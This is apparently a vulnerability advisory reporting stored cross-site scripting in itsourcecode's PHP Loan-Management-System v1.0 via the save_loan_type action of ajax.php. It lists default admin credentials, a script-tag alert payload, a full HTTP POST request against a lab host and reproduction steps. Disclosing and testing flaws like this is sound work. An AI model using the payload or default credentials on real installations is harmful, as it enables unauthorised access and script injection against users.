# Loan-Management-System v1.0 by itsourcecode.com has Cross-site Scripting (XSS)
Vul_Author: Kai Wang

Login Account:admin   Password:admin123

vendors: https://itsourcecode.com/free-projects/php-project/loan-management-system-project-in-php-with-source-code/

Vulnerability File: /Loan/ajax.php

Vulnerability location: /Loan/ajax.php?action=save_loan_type HTTP/1.1

[+] Payload: <script>alert(1)</script>

Tested on Windows 10, phpStudy

There is an example with alert:
'''
POST /Loan/ajax.php?action=save_loan_type HTTP/1.1
Host: 10.12.180.79
Content-Length: 362
Accept: */*
X-Requested-With: XMLHttpRequest
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/111.0.0.0 Safari/537.36 Edg/111.0.1661.41
Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryl0Dh1LXu5fRCTYLI
Origin: http://10.12.180.79
Referer: http://10.12.180.79/Loan/index.php?page=loan_type
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9,en;q=0.8,en-GB;q=0.7,en-US;q=0.6
Cookie: PHPSESSID=d4me9tekbcuef2k8k1qupv9i0t
Connection: close

------WebKitFormBoundaryl0Dh1LXu5fRCTYLI
Content-Disposition: form-data; name="id"


------WebKitFormBoundaryl0Dh1LXu5fRCTYLI
Content-Disposition: form-data; name="type_name"

<script>alert(1)</script>
------WebKitFormBoundaryl0Dh1LXu5fRCTYLI
Content-Disposition: form-data; name="description"

test loans
------WebKitFormBoundaryl0Dh1LXu5fRCTYLI--
'''


Get into the Loan Types page,click the edit button as shown in the image

![image](https://user-images.githubusercontent.com/56795018/221339147-dee0f0e8-3799-406e-a190-ac58d29b096f.png)

input a XSS script in the 'Type' input box

![image](https://user-images.githubusercontent.com/56795018/221339277-9fcefc71-3428-4859-8c90-75244b37aef6.png)

click save and you will see an alert

![image](https://user-images.githubusercontent.com/56795018/221339321-fa21ee0e-3d78-42e2-9bc9-5a6df8dfd3d6.png)
